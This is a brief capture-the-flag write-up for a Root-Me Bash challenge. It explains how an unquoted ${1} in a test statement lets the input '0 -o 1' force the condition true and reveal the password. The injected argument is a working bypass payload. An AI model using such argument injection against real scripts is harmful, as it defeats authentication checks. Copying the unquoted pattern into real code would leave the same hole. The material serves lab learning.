// Link to the challenge https://www.root-me.org/en/Challenges/App-Script/Bash-unquoted-expression-injection?action_solution=voir&debut_affiche_solutions=1#pagination_affiche_solutions
// we consider the code below:
if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"

// It will print the "PASS" value if the condition is true. Because ${1} is unquoted, so it will be split by space. In this case, we will make  the condition of the "if" statement always true by using somthing like: "<any number or string> -o <always true condition>". The "PASS" value will compare with "<any number or string>" part. then "OR" with "<true condition>". This way will make "if" statement always true. For example: "0 -o 1", in the bash, it will become: "if [ $PASS -eq 0 OR 1]".
// By the way, we can execute the wrapper file as below to get the "PASS":

$ ./wrapper "0 -o 1"

==> Then we capture the flag of the challenge
